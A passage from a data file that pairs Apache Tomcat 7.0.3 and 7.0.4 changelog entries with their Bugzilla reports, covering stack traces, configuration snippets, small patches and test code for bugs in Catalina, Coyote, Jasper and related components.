	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2755)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)
	at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)
	at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1544)
	at org.apache.catalina.startup.Catalina.load(Catalina.java:524)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:573)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:288)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:415)
29/09/2010 13:50:37 org.apache.catalina.startup.Catalina load
AVISO: Catalina.start using conf/server.xml: 
java.lang.NullPointerException
	at org.apache.tomcat.util.digester.Digester.createSAXException(Digester.java:2688)
	at org.apache.tomcat.util.digester.Digester.createSAXException(Digester.java:2714)
	at org.apache.tomcat.util.digester.Digester.endElement(Digester.java:1061)
	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.endElement(AbstractSAXParser.java:601)
	at com.sun.org.apache.xerces.internal.parsers.AbstractXMLDocumentParser.emptyElement(AbstractXMLDocumentParser.java:180)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1343)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2755)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)
	at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)
	at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1544)
	at org.apache.catalina.startup.Catalina.load(Catalina.java:524)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:573)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:288)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:415)
Caused by: java.lang.NullPointerException
	at org.apache.catalina.core.StandardContext.getObjectKeyPropertiesNameOnly(StandardContext.java:5570)
	at org.apache.catalina.core.StandardContext.setNamingResources(StandardContext.java:1757)
	at org.apache.catalina.core.StandardContext.getNamingResources(StandardContext.java:1735)
	at org.apache.catalina.startup.SetNextNamingRule.end(SetNextNamingRule.java:99)
	at org.apache.tomcat.util.digester.Digester.endElement(Digester.java:1058)
	... 20 more
29/09/2010 13:50:37 org.apache.catalina.startup.Catalina start
GRAVE: Cannot start server. Server instance is not configured.

Here is my contex.xml OBS: some values were replaced with XXXX 


<?xml version=""1.0"" encoding=""UTF-8""?>
<Context privileged=""true"" reloadable=""true"">

	<WatchedResource>WEB-INF/web.xml</WatchedResource>
	<WatchedResource>META-INF/context.xml</WatchedResource>
	
	<Resource name=""jdbc/bestfork"" auth=""Container""
		type=""com.mchange.v2.c3p0.ComboPooledDataSource"" factory=""org.apache.naming.factory.BeanFactory""
		user=""xxx"" password=""xxxx"" driverClass=""org.postgresql.Driver""
		jdbcUrl=""jdbc:postgresql://localhost:5432/xxxxx"" minPoolSize=""5""
		maxPoolSize=""30"" acquireIncrement=""5"" idleConnectionTestPeriod=""100""
		maxIdleTime=""30""/>

	<Resource name=""mail/Session"" auth=""Container"" type=""javax.mail.Session""
		mail.smtp.host=""xxxx"" mail.smtp.auth=""true""
		username=""xxx"" password=""xxx""
		mail.user=""xxxx"" mail.password=""xxxx""
		mail.smtp.port=""587"" mail.transport.protocol=""smtp"" mail.debug=""true"" />

	<Realm className=""org.apache.catalina.realm.JDBCRealm""
		driverName=""org.postgresql.Driver"" connectionURL=""jdbc:postgresql://localhost:5432/xxxx""
		connectionName=""xxxx"" connectionPassword=""xxxx"" userTable=""usuario""
		userNameCol=""usuario_cpf"" userCredCol=""usuario_senha"" userRoleTable=""usuario_papel""
		roleNameCol=""papel_nome"" digest=""MD5"" />
				

</Context>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50027
Catalina|Tomcat 7.0.4 (markt)|fix|50059|JARs should always be searched for static resources even if the web application is marked as meta-data complete. (markt)|"Resources are not served from /WEB-INF/lib/{*.jar}/META-INF/resources if metadata-complete=""true"" is set in web.xml"|"To reproduce:
1. Make a Servlet 3.0 webapp (lets name it foo) with metadata-complete=""true"" attribute set on the web-app element in the /WEB-IBNF/web.xml.
2. Make a jar holding a single /META-INF/resources/index.html file. The jar should be placed in /WEB-INF/lib (lets name it bar.jar).
3. Start the web app in Tomcat 7.0.2 and in browser go to http://localhost:8080/foo/index.html.

Expected result: 200 response and index.html served.
Actual result: 404

If you modify the web.xml to metadata-complete=""false"" and restart the app now /foo/index.html will respond as expected.

I tried the same webapp with Glassfish v3.0.1 and it works as expected regardless what I set in metadata-complete attribute.

I made a quick look in the servlet 3.0 spec and as far as I can see metadata-complete only regulates annotation and web fragment processing. In the example bar.jar has nothing to do with annotations and it is not a web fragment either but it is still handled differently depending on the metadata-complete attribute."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50059
Catalina|Tomcat 7.0.4 (markt)|fix|50063|Correct regression in fix for 50059 that causes applications marked as meta-data complete to return 404s for all requests. Patch provided by heyoulin. (markt)|Latest trunck can't configure context when metadata-complete is true and version is 3.0|"patch:

### Eclipse Workspace Patch 1.0
#P tomcat-7.0.x
Index: java/org/apache/catalina/startup/ContextConfig.java
===================================================================
--- java/org/apache/catalina/startup/ContextConfig.java	(revision 1006105)
+++ java/org/apache/catalina/startup/ContextConfig.java	(working copy)
@@ -1281,6 +1281,7 @@
                     }
                 }
             } else {
+            	webXml.configureContext(context);
                 ok = true;
             }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50063
Catalina|Tomcat 7.0.4 (markt)|fix|50087|Catch ClassFormatErrors when scanning for annotations. (markt)|"When metadata-complete=""false"" throw illegal JVM_CONSTANT_Class name"|"When metadata-complete=""false"" and add groovy-all-1.7.2.jar to app lib throw

java.lang.reflect.InvocationTargetException
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:290)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:418)
Caused by: java.lang.ClassFormatError: groovy/jmx/builder/package-info : illegal JVM_CONSTANT_Class name: groovy/jmx/builder/package-info
	at java.lang.ClassLoader.defineClass1(Native Method)
	at java.lang.ClassLoader.defineClassCond(ClassLoader.java:632)
	at java.lang.ClassLoader.defineClass(ClassLoader.java:616)
	at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:141)
	at org.apache.catalina.loader.WebappClassLoader.findClassInternal(WebappClassLoader.java:2804)
	at org.apache.catalina.loader.WebappClassLoader.findClass(WebappClassLoader.java:1144)
	at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1639)
	at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1517)
	at org.apache.catalina.startup.ContextConfig.checkHandlesTypes(ContextConfig.java:1952)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsStream(ContextConfig.java:1915)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJar(ContextConfig.java:1802)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(ContextConfig.java:1761)
	at org.apache.catalina.startup.ContextConfig.processAnnotations(ContextConfig.java:1747)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1252)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:881)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:315)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:4700)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:140)
	at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1028)
	at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:773)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:140)
	at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1028)
	at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:278)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:140)
	at org.apache.catalina.core.StandardService.startInternal(StandardService.java:429)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:140)
	at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:662)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:140)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:592)
	... 6 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50087
Coyote|Tomcat 7.0.4 (markt)|fix|49923|Avoid using negative timeouts during acceptor unlock to ensure APR connector shuts down properly. (mturk)|The latest thunk can't shutdown if add tomcat native java library dll|The latest thunk can't shutdown if add tomcat native java library dll|https://bz.apache.org/bugzilla/show_bug.cgi?id=49923
Coyote|Tomcat 7.0.4 (markt)|fix|49972|Fix potential thread safe issue when formatting dates for use in HTTP headers. (markt)|Double-check idiom. Possible data-race.|"r998053
class org/apache/tomcat/util/http/FastHttpDateFormat
http://svn.apache.org/repos/asf/tomcat/tc6.0.x/trunk/java/org/apache/tomcat/util/http/FastHttpDateFormat.java

There is double-check anti-pattern in public static final String getCurrentDate() method
on protected static long currentDateGenerated variable

Concurrent read on line 112
Concurrent write on line 115

P.S.: Maybe I have mistake with determine component"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49972
Coyote|Tomcat 7.0.4 (markt)|fix|50003|Set not maxThreads but minSpareThreads to corePoolSize, if AbstractEndpoint.setMinSpareThreads is called. (kfujino)|AbstractEndpoint.setMinSpareThreads calls executor.setCorePoolSize with incorrect parameter|It's calling setCorePoolSize(maxThreads) instead of setCorePoolSize(minSpareThreads)|https://bz.apache.org/bugzilla/show_bug.cgi?id=50003
Coyote|Tomcat 7.0.4 (markt)|fix|50044|Fix issue when using comet where socket remained in long poll after the comet request has ended. (markt)|NIO HTTP connector aborts GET requests incorrectly.|"I use NIO HTTP Tomcat connector org.apache.coyote.Http11NioProtocol to implement Comet streaming to Android phones. 
The application opens 'primary' persistent Comet connection to receive data from the server. Server sends data to the client periodically. Client can terminate this GET by sending ""disconnect"" GET command to the server. The ""disconnect"" command completes server response and cleans up client connection state. Each client has a unique client Id to identify it.

So the ""connect"" GET looks like: 
/WebContentGateway/Controller?clientId=notimportant&command=connect

And disconenct looks like:
/WebContentGateway/Controller?clientId=notimportant&command=disconnect
The problem I uncovered is that ""disconnect"" GET somehow gets truncated and never invoked on the server side (looks like it is ""lost""). I traced it with Wireshark and Tomcat does receive GET request, but just closes connection without invoking servlet/ sending GET response (the ‚Äúdisconnect‚Äù GET socket connection is obviously different from the ‚Äúprimary‚Äù connection).
I have both client and servlet code and can provide any support to reproduce the problem.
This problem did not exist with build 6.0.16, but can be replicated with the latest Tomcat 6 and 7. It is very important for me to resolve it -  NIO HTTP Tomcat does not look solid it this point.

Client code just send ‚Äúconnect‚Äù command followed by ‚Äúdisconnect‚Äù. There should not be any threading contention because I serialize sending commands in one thread. It hangs on readThread.join(); because ""primary"" thread does not terminate. Also, if I throttle the for loop by putting sleep, the problem does not occur, so it is some sort of a racing condition in Tomcat.

CLIENT CODE:

public class Test extends AndroidTestCase {
    private static final String CLIENT_ID_NOTIMPORTANT = ""clientId=notimportant"";
	private static String url = ""http://172.16.16.33/WebContentGateway/Controller?"";
	private static InputStream cometConnectionInputStream;
	private static Thread readThread;
    
    public void testConnectDisconnect() {
		for (int i = 0; i < 100; i++) {
	        try {
	            URL cometUrl = new URL(url + CLIENT_ID_NOTIMPORTANT + ""&command=connect"");
	            
	            HttpURLConnection cometConnection = (HttpURLConnection) cometUrl.openConnection();
	            cometConnection.setRequestMethod(""GET"");
	            cometConnection.setDoInput(true);
	            cometConnection.setUseCaches(false);
	            
	            cometConnection.setConnectTimeout(10000);
	            cometConnection.setReadTimeout(0);
	
	            cometConnectionInputStream = cometConnection.getInputStream();
	            final CountDownLatch readLatch = new CountDownLatch(1);
	            readThread = new Thread(new Runnable() {
					
					public void run() {
				        System.out.println(""Started Connect GET thread."");
				        readLatch.countDown();
					    byte[] readConnectionReadBuffer = new byte[10 * 1024];
				        try {
				            while ((cometConnectionInputStream.read(readConnectionReadBuffer, 0, readConnectionReadBuffer.length)) >= 0) {
				            }
				        } 
				        catch (Throwable e) {
				        }
				        System.out.println(""Connect GET finished."");
					}
				});
	            readThread.start();
	            readLatch.await();
	            
	            URL disconnectUrl = new URL(url + CLIENT_ID_NOTIMPORTANT + ""&command=disconnect"");
	            
		        System.out.println(""Sending disconnect"");
	            HttpURLConnection disconnectConnection = (HttpURLConnection) disconnectUrl.openConnection();
	            disconnectConnection.setRequestMethod(""GET"");
	            disconnectConnection.setDoInput(true);
	            disconnectConnection.setUseCaches(false);
	            
	            disconnectConnection.setConnectTimeout(10000);
	            disconnectConnection.setReadTimeout(0);
		        InputStream disconnectConnectionInputStream = disconnectConnection.getInputStream();
			    byte[] writeConnectionReadBuffer = new byte[10 * 1024];
				while ((disconnectConnectionInputStream.read(writeConnectionReadBuffer, 0, writeConnectionReadBuffer.length)) >= 0) {
		        }
		
		        disconnectConnectionInputStream.close();
		        
		        readThread.join();
	            
	        }
	        catch (Exception e) {
	        	e.printStackTrace();
	        }
		}
	}
}

SERVER CODE:
public class WebFrameworkServlet extends HttpServlet implements CometProcessor {
	private Map<String, CometClientInfo> cometClientsInfoMap = new ConcurrentHashMap<String, CometClientInfo>();
	private Map<HttpServletResponse, String> cometResponsesMap = new ConcurrentHashMap<HttpServletResponse, String>();
	
	public void event(CometEvent event) throws IOException, ServletException {
		HttpServletRequest request = event.getHttpServletRequest();
		HttpServletResponse response = event.getHttpServletResponse();
		if (event.getEventType() == CometEvent.EventType.BEGIN) {
			if (request.getParameter(ParamNames.IN_PARAM_COMMAND).equals(ParamNames.COMMAND_NAME_CONNECT)) {
				
				String clientId = request.getParameter(ParamNames.COMMAND_LOGIN_CLIENT_ID);
				
				response.setHeader(""pragma"", ""no-cache,no-store"");
				response.setHeader(""cache-control"", ""no-cache,no-store,max-age=0,max-stale=0"");
				
				event.setTimeout(Integer.MAX_VALUE);
				
				Client client = new Client(clientId, null, null);
				
				CometClientInfo cometClientInfo = new CometClientInfo(client, response, 0, event);
				cometClientsInfoMap.put(client.getClientId(), cometClientInfo);
				cometResponsesMap.put(response, client.getClientId());
				
				PrintWriter out = response.getWriter();
				out.print(""{\""statusCode\"" : 0}"");
				out.flush();
			}
			if (request.getParameter(ParamNames.IN_PARAM_COMMAND).equals(ParamNames.COMMAND_NAME_DISCONNECT)) {
				String clientId = request.getParameter(ParamNames.COMMAND_LOGIN_CLIENT_ID);
				CometClientInfo existingClientInfo = cometClientsInfoMap.remove(clientId);
				response.setContentType(""text/json"");
				PrintWriter out = response.getWriter();
				out.print(""{\""statusCode\"" : 0}"");
				out.close();
				
				if (existingClientInfo != null) {
					cometResponsesMap.remove(existingClientInfo.getResponse());
					existingClientInfo.getWriter().close();
					existingClientInfo.getEvent().close();
				}
			}
		} 
		else if (event.getEventType() == CometEvent.EventType.ERROR) {
			event.close();
			
			String clientId = cometResponsesMap.remove(response);
			if (clientId != null) {
				CometClientInfo cometClientInfo = cometClientsInfoMap.remove(clientId);
				if (cometClientInfo != null) {
					cometClientInfo.getClient().setDisconnectTime(System.currentTimeMillis());
				}
			}
		} 
		else if (event.getEventType() == CometEvent.EventType.END) {
			event.close();
			
			String clientId = cometResponsesMap.remove(response);
			if (clientId != null) {
				CometClientInfo cometClientInfo = cometClientsInfoMap.remove(clientId);
				if (cometClientInfo != null) {
					cometClientInfo.getClient().setDisconnectTime(System.currentTimeMillis());
				}
			}
		}
	}
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50044
Coyote|Tomcat 7.0.4 (markt)|fix|50054|Correctly handle the setting of minSpareThreads in AJP connector. (kfujino)|When the AJP connector is used, minSpareThreads cannot be used.|"I found following warnning messages. 

==
Oct 7, 2010 2:25:27 PM org.apache.catalina.startup.SetAllPropertiesRule begin
WARNING: [SetAllPropertiesRule]{Server/Service/Connector} Setting property 'minSpareThreads' to '31' did not find a matching property.
==

The AJP connector's configs are the following. 
<Connector port=""8009"" protocol=""AJP/1.3"" redirectPort=""8443"" minSpareThreads=""100""/>

When I used the Http connector, minSpareThreads was able to be used. 

org.apache.coyote.ajp.AjpProtocol doesn't set the minSpareThreads to org.apache.tomcat.util.net.JIoEndpoint.

I made a patch.
This patch was made based on AbstractHttp11Protocol. 

Best regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50054
Coyote|Tomcat 7.0.4 (markt)|fix|50072|Fix issues when using a non-blocking read for the request line with the NIO connector that could result in the request line being mis-read. (markt)|Blank responses|"Created attachment 26153 [details]
Tcp dump log with blank and normal responses.

We are facing problem with empty file response from server, after upgrading from Apache 6.0.20 to any higher version. Approx 20% generated responses went ok, 80% responses were empty files without any error log. Types of files was XML, HTML pages - with no diffrence. Files were requested by browsers, PHP scripts (XML) from different client servers.

I started to log all the requests on top of doGet() method and all the normal responses logged correctly. Incorrect requests never get to aplication, empty files had no log.

There was no diffrence when server had load on the resources were free. We use ""org.apache.coyote.http11.Http11NioProtocol"", requests were sent with GET method. I attach TCPdump from one of the client-side servers - what they see. After downgrade back to 6.0.20 the problem dissapeared, so we are kind of locked there."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50072
Jasper|Tomcat 7.0.4 (markt)|fix|49986|Fix thread safety issue for JSP reload. (timw)|Double-check locking. Possible data-race in JspServletWrapper|"r998053
http://svn.apache.org/repos/asf/tomcat/tc6.0.x/trunk/java/org/apache/jasper/servlet/JspServletWrapper.java

Common anti-pattern: Double checked locking. I don't know is this race dangerous or no.

Race on private boolean reload
    
public Servlet getServlet()
        throws ServletException, IOException, FileNotFoundException
    {
        if (reload) {
            synchronized (this) {
                // Synchronizing on jsw enables simultaneous loading
                // of different pages, but not the same page.
                if (reload) {
                    // This is to maintain the original protocol.
                   
..........

                    theServlet = servlet;
                    reload = false;
                }
            }    
        }
        return theServlet;
    }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49986
Jasper|Tomcat 7.0.4 (markt)|fix|49998|Make jsp:root detection work with single quoted attributes as well. (timw)|"ParserController.hasJspRoot() does not detect JSP as using XML syntax if <jsp:root> namespace declaration uses ' delimiters instead of """|"I have a simple JSP in XML syntax that looks like this:

  <jsp:root xmlns:jsp=""http://java.sun.com/JSP/Page"" version=""2.0"">
    content goes here
  </jsp:root>

This works fine. However, if I use ' instead of "" for the namespace declaration, it fails to detect that XML syntax is being used, giving a ""no such action"" error instead:

  <jsp:root xmlns:jsp='http://java.sun.com/JSP/Page' version='2.0'>
    content goes here
  </jsp:root>

Note that the check is skipped and the bug isn't exposed if external information on the JSP syntax is available (for example, from the web.xml, or because the file ends in .jspx).

The problem seems to be on line 615 of org.apache.jasper.compiler.ParserController (in hasJspRoot). When trying to find the namespace declaration, the code only looks for a "" character, and does not consider ' characters."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49998
Jasper|Tomcat 7.0.4 (markt)|fix||Correctly handle the setting of primitive bean values via expression language. (markt)|||
Jasper|Tomcat 7.0.4 (markt)|fix||Don't swallow exceptions when processing TLD files and handle the case when there is no web.xml file. (markt)|||
Jasper|Tomcat 7.0.4 (markt)|fix|50066|Fix building of recursive tag files when the file depends on a JAR file. Patch provided by Sylvain Laurent. (markt)|Cannot compile recursive tag with ant if it uses a class from the webapp|"The following simple tag file cannot be compiled with the jspc ant task (or the jpsc maven plugin) :

<%@ taglib prefix=""c"" uri=""http://java.sun.com/jsp/jstl/core"" %>
<%@ taglib prefix=""tags"" tagdir=""/WEB-INF/tags"" %>

Hello world !
<c:if test=""${false}"" >
    <tags:recursive />
</c:if>

The error is 
org.apache.jasper.JasperException: /WEB-INF/tags/recursive.tag(21,0) Unable to load tag handler class ""org.apache.taglibs.standard.tag.rt.core.IfTag"" for tag ""c:if""

It's OK when the compilation is done ""online"", when the first jsp that uses this tag is called with a http request.

The problem is that japer's TagFileProcessor does not set the correct classloader when compiling recursive tags. It works in online mode because the parent classloader of the jsp classloader is the webapp classloader."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50066
Jasper|Tomcat 7.0.4 (markt)|fix|50078|Fix threading problem in EL caches. Patch provided by Takayoshi Kimura. (markt)|Concurrent access to WeakHashMap in ConcurrentCache causes infinite loop, 100% CPU usage|"Created attachment 26163 [details]
Proposed patch for tc6 trunk

There is a WeakHashMap instance that is accessed concurrently and sometimes causes infinite loop. It's extremely hard to reproduce but you can refer to similar concurrent access looping problem by the following search keywords:

* weakhashmap infinite loop 100% cpu stuck synchronized concurrent
* java.util.WeakHashMap.put(WeakHashMap.java:405)
* java.util.WeakHashMap.get(WeakHashMap.java:355)

The org.apache.el.util.ConcurrentCache and javax.el.BeanELResolver.ConcurrentCache classes have this problem.

There are 20 threads get stuck at the following thread stack:

""ajp-146.215.106.42-8009-38"" daemon prio=10 tid=0x00002aab6425d800 nid=0x135b runnable [0x0000000048c14000]
   java.lang.Thread.State: RUNNABLE
	at java.util.WeakHashMap.get(WeakHashMap.java:355)
	at org.apache.el.util.ConcurrentCache.get(ConcurrentCache.java:24)
	at org.apache.el.lang.ExpressionBuilder.createNodeInternal(ExpressionBuilder.java:90)

""ajp-146.215.106.42-8009-18"" daemon prio=10 tid=0x00002aab643ea000 nid=0x538d runnable [0x00000000458fd000]
   java.lang.Thread.State: RUNNABLE
	at java.util.WeakHashMap.put(WeakHashMap.java:405)
	at java.util.WeakHashMap.putAll(WeakHashMap.java:518)
	at org.apache.el.util.ConcurrentCache.put(ConcurrentCache.java:34)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50078
Jasper|Tomcat 7.0.4 (markt)|add||Make EL cache sizes configurable. (markt)|||
Web applications|Tomcat 7.0.4 (markt)|fix||Apply filters to default home page so copyright year is correctly displayed. (markt)|||
Other|Tomcat 7.0.4 (markt)|update|48716|Do not call reset if the default LogManager is in use. (markt)|Embedded Tomcat JULI aggressively resetting default logging configuration|"When using Tomcat embedded in conjunction with default JDK logging, any removal of a StandardContext instance from the Host container will lead to a reset of all JDK logging configuration.

This is due to 

StandardContext.stop() 

calling 

WebappLoader.stop() 

calling 

org.apache.juli.logging.LogFactory.release(ClassLoader) 

which in turn calls 

LogManager.getLogManager().reset();

and the fact that, when using JDK logging, LogManager.getLogManager returns the default log manager rather that JULI's log manager. 

Suggestion: Check whether the log manager is actually JULI's."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48716
Other|Tomcat 7.0.4 (markt)|fix|50013|Correctly package classes from org.apache.tomcat.util.file and add the tomcat-util.jar to the class path for the Ant tasks. Based on a patch provided by Sylvain Laurent. (markt)|missing classes when running catalina ant tasks|"With trunk after 7.0.2 :

- tomcat-util.jar is missing in /bin/catalina-tasks.xml
- even after adding this, I still have a NoClassDefFoundError for org.apache.tomcat.util.file.Matcher . Apparently this is a new class in a new package and the build script does not put it in any jar built."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50013
Catalina|Tomcat 7.0.3 (markt)|fix|48644|Review all instances of catching Throwable and re-throw where appropriate. (markt)|Code should never ignore throwable|"There seem to be quite a few places where code catches Throwable and ignores it.

For example:

ant.jmx.JMXAccessorQueryTask.bindAttributes
ant.jmx.JMXAccessorTask.execute
core.StandardContext - lots of methods

In most cases, catching Exception would be enough."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48644
Catalina|Tomcat 7.0.3 (markt)|update||Allow glob patterns in the jarsToSkip configuration and add some debug logging to the jar scanner. (rjung)|||
Catalina|Tomcat 7.0.3 (markt)|fix|48738|Workaround a couple of long standing JDK bugs to enable GZIP compressed output streams to be flushed. Based on a patch provided by Jiong Wang. (markt)|[PATCH]Allow GzipOutputFilter to send partial result when flushBuffer() is called|"Created attachment 24979 [details]
patch for the making GzipOutputFilter work with early flush

As part of our site speed optimizations (at Linkedin) we bumped into a problem when trying to do partial flush of compressed content stream from Tomcat to the browser. We discovered the root cause to be a couple of long outstanding JDK bugs:

 http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=4255743
 http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=4813885

Basically, with the GzipOutputFilter turned on, the GZIPOutputStream it uses internally buffers the data that's been sent over, and does not flush to client (browser) when flushBuffer() is invoked.

We have produced a patch which we verified internally, that it did work to do a partial flush on the compressed stream. We also have a unit testcase included in the patch to quickly show the problem. 

Early flush is a quite useful technique that many sites out there can benefit from to speed up the page download/rendering time, and by having it working in tomcat would benefit the existing and new customers. 

Thanks!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=48738
Catalina|Tomcat 7.0.3 (markt)|update|48967|"Replace strings ""catalina.base"" and ""catalina.home"" by globally defined constants. Patch provided by Marc Guillemot. (rjung)"|"Externalize Strings ""catalina.base"" and ""catalina.home"""|"Created attachment 25169 [details]
Patch externalizing strings

Strings ""catalina.base"" and ""catalina.home"" are present multiple times in the code base. Most of them should be replaced by a reference to a constant."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48967
Catalina|Tomcat 7.0.3 (markt)|fix|49195|Don't report an error when shutting down a Windows service for a Tomcat instance that has a disabled shutdown port. (markt)|Using -1 as shutdown port with Windows service works, but prints error message|"1. Install Tomcat as a service on Windows
2. Specify <Server port=""-1"" in server.xml
3. Start the service, and then stop the service.
4. The following is printed in the catalina.2010-04-27.log:

27.04.2010 17:49:13 org.apache.catalina.startup.Catalina stopServer
SEVERE: No shutdown port configured. Shut down server through OS signal. Server not shut down.

It is just a message. Tomcat stops regardless of it:
After printing the message Catalina#stopServer() performs System.exit(1) which results in Tomcat shutdown.

I think that when service launcher stops Tomcat, Catalina#server is not null. That can be used to differentiate the two use cases.

There could be improvements on how to stop Tomcat. E.g., to call Catalina.stop(). If that is the case, it would be better to use wait(10000) instead of sleep(10000) in StandardServer.await(), so that it could be woken by a notifyAll() call, or use interrupt() call to wake it up (if we know the thread). System.exit(0) would work regardless of all that.

I suppose that jsvc may show the same behaviour, but I have not tried."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49195
Catalina|Tomcat 7.0.3 (markt)|fix|49209|Prevent possible AccessControlException during undeployment when running with a security manager. Patch provided by Sylvain Laurent. (markt)|AccessControlException when undeploying application|"When running Tomcat with a SecurityManager, an AccessControlException is thrown during undeployment.

Stack trace:

Caused by: java.security.AccessControlException: access denied (java.lang.RuntimePermission getClassLoader)
	at java.security.AccessControlContext.checkPermission(AccessControlContext.java:323)
	at java.security.AccessController.checkPermission(AccessController.java:546)
	at java.lang.SecurityManager.checkPermission(SecurityManager.java:532)
	at java.lang.Class.getClassLoader(Class.java:594)
	at org.apache.catalina.loader.JdbcLeakPrevention.clearJdbcDriverRegistrations(JdbcLeakPrevention.java:49)

I assume the default catalina.policy should be updated, to take this case into account."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49209
Catalina|Tomcat 7.0.3 (markt)|fix|49657|Handle CGI executables with spaces in the path. (markt)|"In CGI Mode, ""executable"" full path with spaces does not work"|"In CGI mode, if you specify a full path for a command, containing blank, 
it does not work

example :
       <init-param>
            <param-name>executable</param-name>
            <param-value>c:\Tools\mycommand</param-value>
        </init-param>
is OK but

       <init-param>
            <param-name>executable</param-name>
            <param-value>c:\Program Files\mycommand</param-value>
          </init-param>
does not work well with error like


7 juil. 2010 15:51:52 org.apache.catalina.core.ApplicationContext log
INFO: cgi: runCGI (stderr):'C:\Program' is not recognized as an internal or external command,

Need probably to add "" in for cgiExcecutable in CGIServlet.java,  like it is done
